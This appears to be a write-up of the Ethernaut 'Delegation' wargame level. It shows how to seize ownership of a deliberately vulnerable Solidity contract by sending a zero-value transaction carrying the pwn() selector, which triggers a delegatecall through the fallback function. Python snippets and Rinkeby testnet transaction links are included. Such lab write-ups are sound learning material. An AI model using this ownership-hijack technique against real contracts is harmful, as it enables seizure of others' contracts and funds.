# Delegation

## Objectives

The goal of this level is for you to claim ownership of the instance you are given.

## Solution

The contract Delegate defines the function `pwn()` which easily allows you to take control of the contract. However, to take control of the Delegation contract, we must call this `pwn()` function through a low level delegate call where we pass the `pwn()` function encoded through the data sent in a transaction that will trigger the `fallback()` function of the Delegation contract.

The ownership can be taken by performing a transfer of 0 wei (or low level `call.data`) to the Delegation contract with `0xdd365b8b` in the message data. These are the first 4 bytes of the SHA-3 hash for the text `'pwn()'`.

## How I did it

1. Obtain the SHA-3 hash for the text `'pwn()'` using `web3.sha3()` from web3.py and extract the first 4 bytes of the hash.

```python
pwn_bytes = web3.sha3(text='pwn()').hex()[0:10]
```

2. Perform a simple transfer with a value of 0 but including the bytes in the tx data.

```python
acc.transfer(to=delegation.address, amount=0, data=pwn_bytes)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xe258aaa31a241c776693da995e11fc3fa0c9777b7e88cc6820767e3f6a914e91

3. Check whether we are owner or not

```python
owner_assertion = delegation.owner() == acc.address
print(f'The owner of the contract is {acc.address}, therefore the assertion is {owner_assertion}')
```

## Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x69562563ddeb59bc8beeb241403bf8406fd9bdb7e4534f940052012f01f228ea
